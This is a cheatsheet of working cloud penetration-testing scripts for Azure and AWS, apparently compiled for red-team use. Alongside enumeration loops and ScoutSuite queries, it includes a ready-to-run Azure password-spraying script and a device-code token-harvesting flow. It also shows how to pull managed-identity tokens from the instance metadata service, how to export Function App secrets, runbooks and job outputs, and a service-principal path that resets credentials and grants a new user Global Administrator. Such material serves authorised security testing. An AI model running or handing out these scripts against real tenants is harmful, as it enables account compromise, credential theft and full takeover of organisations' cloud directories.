# Advanced Cloud Pentesting Scripts

Reference: [Cloud Pentesting Cheatsheet by Beau Bullock](https://github.com/dafthack/CloudPentestCheatsheets)

## Azure Automation Runbooks

### Export All Runbooks from All Subscriptions

```powershell
$subs = Get-AzSubscription
Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    mkdir .\$subscriptionid\
    Select-AzSubscription -Subscription $subscriptionid
    $runbooks = @()
    $autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName
    foreach ($i in $autoaccounts){
        $runbooks += Get-AzAutomationRunbook -AutomationAccountName $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,Name
    }
    foreach($r in $runbooks){
        Export-AzAutomationRunbook -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -Name $r.Name -OutputFolder .\$subscriptionid\
    }
}
```

### Export All Automation Job Outputs

```powershell
$subs = Get-AzSubscription
$jobout = @()
Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    Select-AzSubscription -Subscription $subscriptionid
    $jobs = @()
    $autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName
    foreach ($i in $autoaccounts){
        $jobs += Get-AzAutomationJob $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,JobId
    }
    foreach($r in $jobs){
        $jobout += Get-AzAutomationJobOutput -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -JobId $r.JobId
    }
}
$jobout | Out-File -Encoding ascii joboutputs.txt
```

## Azure Function Apps

### List All Function App Hostnames

```powershell
$functionapps = Get-AzFunctionApp
foreach($f in $functionapps){
    $f.EnabledHostname
}
```

### Extract Function App Information

```powershell
$subs = Get-AzSubscription
$allfunctioninfo = @()
Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    Select-AzSubscription -Subscription $subscriptionid
    $functionapps = Get-AzFunctionApp
    foreach($f in $functionapps){
        $allfunctioninfo += $f.config | Select-Object AcrUseManagedIdentityCred,AcrUserManagedIdentityId,AppCommandLine,ConnectionString,CorSupportCredentials,CustomActionParameter
        $allfunctioninfo += $f.SiteConfig | fl
        $allfunctioninfo += $f.ApplicationSettings | fl
        $allfunctioninfo += $f.IdentityUserAssignedIdentity.Keys | fl
    }
}
$allfunctioninfo
```

## Azure Device Code Login Flow

### Initiate Device Code Login

```powershell
$body = @{
    "client_id" = "1950a258-227b-4e31-a9cf-717495945fc2"
    "resource"  = "https://graph.microsoft.com"
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers = @{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$authResponse
```

Navigate to https://microsoft.com/devicelogin and enter the code.

### Retrieve Access Tokens

```powershell
$body = @{
    "client_id"  = "1950a258-227b-4e31-a9cf-717495945fc2"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code"       = $authResponse.device_code
}
$Tokens = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$Tokens
```

## Azure Managed Identity Token Retrieval

```powershell
# From Azure VM
Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Method GET -Headers @{Metadata="true"} -UseBasicParsing

# Full instance metadata
$instance = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
$instance
```

## AWS Region Iteration Scripts

Create `regions.txt`:
```
us-east-1
us-east-2
us-west-1
us-west-2
ca-central-1
eu-west-1
eu-west-2
eu-west-3
eu-central-1
eu-north-1
ap-southeast-1
ap-southeast-2
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
sa-east-1
```

### List All EC2 Public IPs

```bash
while read r; do
    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $r | jq -r '.[]' >> ec2-public-ips.txt
done < regions.txt
sort -u ec2-public-ips.txt -o ec2-public-ips.txt
```

### List All ELB DNS Addresses

```bash
while read r; do
    aws elbv2 describe-load-balancers --query LoadBalancers[*].DNSName --region $r | jq -r '.[]' >> elb-public-dns.txt
    aws elb describe-load-balancers --query LoadBalancerDescriptions[*].DNSName --region $r | jq -r '.[]' >> elb-public-dns.txt
done < regions.txt
sort -u elb-public-dns.txt -o elb-public-dns.txt
```

### List All RDS DNS Addresses

```bash
while read r; do
    aws rds describe-db-instances --query=DBInstances[*].Endpoint.Address --region $r | jq -r '.[]' >> rds-public-dns.txt
done < regions.txt
sort -u rds-public-dns.txt -o rds-public-dns.txt
```

### Get CloudFormation Outputs

```bash
while read r; do
    aws cloudformation describe-stacks --query 'Stacks[*].[StackName, Description, Parameters, Outputs]' --region $r | jq -r '.[]' >> cloudformation-outputs.txt
done < regions.txt
```

## ScoutSuite jq Parsing Queries

### AWS Queries

```bash
# Find All Lambda Environment Variables
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.awslambda.regions[].functions[] | select (.env_variables != []) | .arn, .env_variables' >> lambda-all-environment-variables.txt
done

# Find World Listable S3 Buckets
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id, .services.s3.findings."s3-bucket-AuthenticatedUsers-read".items[]' >> s3-buckets-world-listable.txt
done

# Find All EC2 User Data
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].vpcs[].instances[] | select (.user_data != null) | .arn, .user_data' >> ec2-instance-all-user-data.txt
done

# Find EC2 Security Groups That Whitelist AWS CIDRs
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id' >> ec2-security-group-whitelists-aws-cidrs.txt
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.findings."ec2-security-group-whitelists-aws".items' >> ec2-security-group-whitelists-aws-cidrs.txt
done

# Find All EC2 EBS Volumes Unencrypted
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].volumes[] | select(.Encrypted == false) | .arn' >> ec2-ebs-volume-not-encrypted.txt
done

# Find All EC2 EBS Snapshots Unencrypted
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].snapshots[] | select(.encrypted == false) | .arn' >> ec2-ebs-snapshot-not-encrypted.txt
done
```

### Azure Queries

```bash
# List All Azure App Service Host Names
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.appservice.subscriptions[].web_apps[].host_names[]'

# List All Azure SQL Servers
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -jr '.services.sqldatabase.subscriptions[].servers[] | .name,".database.windows.net","\n"'

# List All Azure Virtual Machine Hostnames
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -jr '.services.virtualmachines.subscriptions[].instances[] | .name,".",.location,".cloudapp.windows.net","\n"'

# List Storage Accounts
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.storageaccounts.subscriptions[].storage_accounts[] | .name'

# List Disks Encrypted with Platform Managed Keys
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq '.services.virtualmachines.subscriptions[].disks[] | select(.encryption_type = "EncryptionAtRestWithPlatformKey") | .name' > disks-with-pmks.txt
```

## Password Spraying with Az PowerShell

```powershell
$userlist = Get-Content userlist.txt
$passlist = Get-Content passlist.txt
$linenumber = 0
$count = $userlist.count
foreach($line in $userlist){
    $user = $line
    $pass = ConvertTo-SecureString $passlist[$linenumber] -AsPlainText -Force
    $current = $linenumber + 1
    Write-Host -NoNewline ("`r[" + $current + "/" + $count + "]" + "Trying: " + $user + " and " + $passlist[$linenumber])
    $linenumber++
    $Cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
    try {
        Connect-AzAccount -Credential $Cred -ErrorAction Stop -WarningAction SilentlyContinue
        Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
        Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
    }
    catch {
        $Failure = $_.Exception
        if ($Failure -match "ID3242") { continue }
        else {
            Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
            Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
            Add-Content valid-creds.txt $Failure.Message
            Write-Host -ForegroundColor red $Failure.Message
        }
    }
}
```

## Service Principal Attack Path

```bash
# Reset service principal credential
az ad sp credential reset --id <app_id>
az ad sp credential list --id <app_id>

# Login as service principal
az login --service-principal -u "app id" -p "password" --tenant <tenant ID> --allow-no-subscriptions

# Create new user in tenant
az ad user create --display-name <name> --password <password> --user-principal-name <upn>

# Add user to Global Admin via MS Graph
$Body="{'principalId':'User Object ID', 'roleDefinitionId': '62e90394-69f5-4237-9190-012177145e10', 'directoryScopeId': '/'}"
az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body $Body
```

## Additional Tools Reference

| Tool | URL | Purpose |
|------|-----|---------|
| MicroBurst | github.com/NetSPI/MicroBurst | Azure security assessment |
| PowerZure | github.com/hausec/PowerZure | Azure post-exploitation |
| ROADTools | github.com/dirkjanm/ROADtools | Azure AD enumeration |
| Stormspotter | github.com/Azure/Stormspotter | Azure attack path graphing |
| MSOLSpray | github.com/dafthack | O365 password spraying |
| AzureHound | github.com/BloodHoundAD/AzureHound | Azure AD attack paths |
| WeirdAAL | github.com/carnal0wnage/weirdAAL | AWS enumeration |
| Pacu | github.com/RhinoSecurityLabs/pacu | AWS exploitation |
| ScoutSuite | github.com/nccgroup/ScoutSuite | Multi-cloud auditing |
| cloud_enum | github.com/initstring/cloud_enum | Public resource discovery |
| GitLeaks | github.com/zricethezav/gitleaks | Secret scanning |
| TruffleHog | github.com/dxa4481/truffleHog | Git secret scanning |
| ip2Provider | github.com/oldrho/ip2provider | Cloud IP identification |
| FireProx | github.com/ustayready/fireprox | IP rotation via AWS API Gateway |

## Vulnerable Training Environments

| Platform | URL | Purpose |
|----------|-----|---------|
| CloudGoat | github.com/RhinoSecurityLabs/cloudgoat | AWS vulnerable lab |
| SadCloud | github.com/nccgroup/sadcloud | Terraform misconfigs |
| Flaws Cloud | flaws.cloud | AWS CTF challenges |
| Thunder CTF | thunder-ctf.cloud | GCP CTF challenges |
